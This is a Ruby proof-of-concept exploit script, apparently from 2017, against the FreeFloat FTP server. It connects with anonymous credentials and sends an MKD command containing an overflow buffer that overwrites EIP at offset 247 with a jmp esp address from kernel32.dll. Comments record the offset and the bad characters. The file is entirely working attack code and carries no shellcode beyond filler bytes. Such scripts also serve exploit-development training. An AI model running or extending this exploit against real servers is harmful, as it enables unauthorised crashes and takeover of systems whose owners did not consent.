# Brad Beacham 2017
#
require 'socket'

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end
# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: freefloatPOC.rb [<ipaddres>:<port>]".error
	abort()
elsif !input[0].include? ":"
	puts "USAGE: freefloatPOC.rb [<ipaddres>:<port>]".error
	abort()
end
host = input[0].split(":").first
port = input[0].split(":").last

puts "#######################################################".event
#####################################################################################
# INFORMATION
# EIP contains normal pattern : 0x69413269 (offset 247)
# Badchars: "\x00\x0A\x0D"
# 0x7C86467B : jmp esp #  ret  | kernal32.dll
#####################################################################################
# Generate the exploit
buffer = 1000
offset = 247
junk = "\x41" * offset
eip = "\x7B\x46\x86\x7C"
filler = "\x43" * (buffer - (junk.length + eip.length))
# The final chunk of data which we will send to the server to trigger the exploit.
exploit = junk + eip + filler

#####################################################################################
# Send the exploit
begin
	puts "Connecting to FTP server [#{host}:#{port}] and sending evil buffer".event
	puts ""
	socket = TCPSocket.new(host, port)
	data = socket.recv(1024)
	socket.write("USER anonymous\r\n")
	socket.recv(1024)
	socket.write("PASS anonymous\r\n")
	socket.recv(1024)
	socket.write("MKD #{exploit}\r\n")
	socket.recv(1024)
    socket.write "QUIT\n"
	socket.close
rescue
	puts "Unable to connect to FTP server!".error
	puts ""
end
 
puts ""
